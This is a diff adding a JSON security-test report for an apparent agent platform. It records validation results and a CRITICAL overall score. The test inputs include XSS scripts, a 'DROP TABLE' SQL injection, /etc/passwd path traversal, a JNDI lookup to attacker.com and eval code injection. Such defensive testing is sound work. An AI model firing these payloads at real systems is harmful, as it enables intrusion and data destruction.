@@ -1,0 +1,299 @@
+{
+  "timestamp": "2025-07-04T17:53:17.584Z",
+  "securityTests": [
+    {
+      "category": "Input Validation",
+      "tests": [
+        {
+          "input": "\"><script>alert(\"xss\")</script>",
+          "type": "XSS Script",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "'; DROP TABLE agents; --",
+          "type": "SQL Injection",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "../../../etc/passwd",
+          "type": "Path Traversal",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "${jndi:ldap://attacker.com/x}",
+          "type": "Template Injection",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "<img src=x onerror=alert(1)>",
+          "type": "Unknown",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "data:text/javascript,alert(1)",
+          "type": "JavaScript Protocol",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...",
+          "type": "Buffer Overflow",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "{{7*7}}",
+          "type": "Template Injection",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "\u0000\u0001\u0002",
+          "type": "Null Byte",
+          "blocked": false,
+          "error": null
+        },
+        {
+          "input": "eval(\"malicious_code()\")",
+          "type": "Code Injection",
+          "blocked": false,
+          "error": null
+        }
+      ],
+      "passed": false,
+      "startTime": 1751651597588,
+      "duration": 163
+    },
+    {
+      "category": "SQL Injection Prevention",
+      "tests": [],
+      "passed": false,
+      "startTime": 1751651597752,
+      "error": "persistence.initialize is not a function",
+      "duration": 1
+    },
+    {
+      "category": "WASM Security",
+      "tests": [
+        {
+          "name": "WASM Module Isolation",
+          "passed": true,
+          "details": "WASM isolation verified"
+        },
+        {
+          "name": "Memory Access Bounds",
+          "passed": true,
+          "details": "Memory bounds respected"
+        }
+      ],
+      "passed": true,
+      "startTime": 1751651599991,
+      "duration": 12
+    },
+    {
+      "category": "Network Security",
+      "tests": [
+        {
+          "name": "WebSocket Security",
+          "passed": false,
+          "details": [
+            {
+              "check": "Rate limiting protection",
+              "passed": true
+            },
+            {
+              "check": "Input validation on messages",
+              "passed": true
+            },
+            {
+              "check": "Connection authentication",
+              "passed": false
+            },
+            {
+              "check": "Message encryption readiness",
+              "passed": true
+            }
+          ]
+        }
+      ],
+      "passed": false,
+      "startTime": 1751651600004,
+      "duration": 0
+    },
+    {
+      "category": "Data Sanitization",
+      "tests": [
+        {
+          "type": "XSS",
+          "input": "<script>alert(\"xss\")</script>...",
+          "sanitized": true,
+          "passed": true,
+          "blocked": true
+        },
+        {
+          "type": "JavaScript Protocol",
+          "input": "data:text/javascript,void(0)...",
+          "sanitized": true,
+          "passed": true,
+          "blocked": true
+        },
+        {
+          "type": "Data URI",
+          "input": "data:text/html,<script>alert(1...",
+          "sanitized": true,
+          "passed": true,
+          "blocked": true
+        },
+        {
+          "type": "Template Injection",
+          "input": "{{constructor.constructor(\"ale...",
+          "sanitized": true,
+          "passed": true,
+          "blocked": true
+        }
+      ],
+      "passed": true,
+      "startTime": 1751651600004,
+      "duration": 12
+    },
+    {
+      "category": "Access Control",
+      "tests": [
+        {
+          "name": "Agent Isolation",
+          "description": "Agents cannot access each other's private data",
+          "passed": true,
+          "details": "Agent isolation maintained"
+        },
+        {
+          "name": "File System Access",
+          "description": "Restricted file system access",
+          "passed": false,
+          "details": "Unauthorized file access allowed"
+        }
+      ],
+      "passed": false,
+      "startTime": 1751651600017,
+      "duration": 28
+    },
+    {
+      "category": "Cryptographic Security",
+      "tests": [
+        {
+          "name": "Random Number Generation",
+          "passed": true,
+          "details": "Generated 1000/1000 unique values"
+        },
+        {
+          "name": "Crypto Module Availability",
+          "passed": true,
+          "details": "Crypto functions working correctly"
+        },
+        {
+          "name": "Weak Cipher Detection",
+          "passed": true,
+          "details": "Weak ciphers blocked"
+        }
+      ],
+      "passed": true,
+      "startTime": 1751651600045,
+      "duration": 2
+    },
+    {
+      "category": "Buffer Overflow Protection",
+      "tests": [
+        {
+          "name": "Large String Input",
+          "inputSize": 100000,
+          "executionTime": 0,
+          "passed": true,
+          "protected": true
+        },
+        {
+          "name": "Extremely Large Array",
+          "inputSize": 350001,
+          "executionTime": 0,
+          "passed": true,
+          "protected": true
+        },
+        {
+          "name": "Deep Object Nesting",
+          "inputSize": 11016,
+          "executionTime": 0,
+          "passed": true,
+          "protected": true
+        }
+      ],
+      "passed": true,
+      "startTime": 1751651601878,
+      "duration": 22
+    }
+  ],
+  "vulnerabilities": [],
+  "memoryTests": [
+    {
+      "category": "Memory Safety",
+      "tests": [
+        {
+          "name": "Memory Growth Test",
+          "initialMemory": 9083416,
+          "peakMemory": 9156920,
+          "growth": 73504,
+          "passed": true
+        },
+        {
+          "name": "Garbage Collection Test",
+          "initialMemory": 9161024,
+          "peakMemory": 15668400,
+          "finalMemory": 15683064,
+          "recovered": -14664,
+          "passed": false
+        },
+        {
+          "name": "Circular Reference Test",
+          "initialMemory": 15688744,
+          "peakMemory": 15929536,
+          "finalMemory": 15931616,
+          "passed": true
+        },
+        {
+          "name": "Large Object Handling",
+          "largeArrayLength": 10000000,
+          "passed": true
+        }
+      ],
+      "passed": false,
+      "startTime": 1751651597754,
+      "duration": 2236
+    },
+    {
+      "category": "Memory Leak Detection",
+      "iterations": 100,
+      "memoryGrowth": 2154776,
+      "passed": true,
+      "startTime": 1751651600047,
+      "duration": 1831
+    }
+  ],
+  "recommendations": [
+    "Implement stricter input validation and sanitization",
+    "Review and strengthen SQL injection prevention measures",
+    "Add rate limiting to prevent abuse",
+    "Conduct regular security audits",
+    "Implement security monitoring and alerting",
+    "Consider additional security hardening measures",
+    "Enable security headers for web interfaces",
+    "Implement proper logging and monitoring",
+    "Regular dependency vulnerability scanning"
+  ],
+  "overallSecurity": {
+    "score": 0,
+    "level": "CRITICAL",
+    "riskAssessment": []
+  }
+}
